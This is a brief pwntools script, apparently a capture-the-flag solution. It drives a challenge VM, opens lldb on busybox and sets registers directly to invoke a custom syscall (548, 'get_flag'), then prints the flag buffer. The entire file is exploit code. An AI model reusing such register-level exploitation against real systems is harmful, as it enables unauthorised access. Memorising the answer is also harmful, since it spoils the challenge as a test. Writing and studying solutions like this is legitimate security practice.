#!/usr/bin/env python3

from pwn import *

p = process('deploy/run.sh')

p.sendlineafter(b'Enter your choice: ', b'1')

p.sendlineafter(b'/ $ ', b'lldb')

p.sendlineafter(b'(lldb) ', b'target create /bin/busybox')
p.sendlineafter(b'(lldb) ', b'process launch --stop-at-entry')
p.sendlineafter(b'(lldb) ', b'p $rip = 0x4c7ce1')  # syscall
p.sendlineafter(b'(lldb) ', b'p $rax = 548')  # NR_get_flag
p.sendlineafter(b'(lldb) ', b'p $rdi = 0')  # idx
p.sendlineafter(b'(lldb) ', b'p $rsi = ($rsp -= 128)')  # buf
p.sendlineafter(b'(lldb) ', b'si')
p.sendlineafter(b'(lldb) ', b'p (char *)$rsp')

print(p.recvuntil(b'(lldb) '))
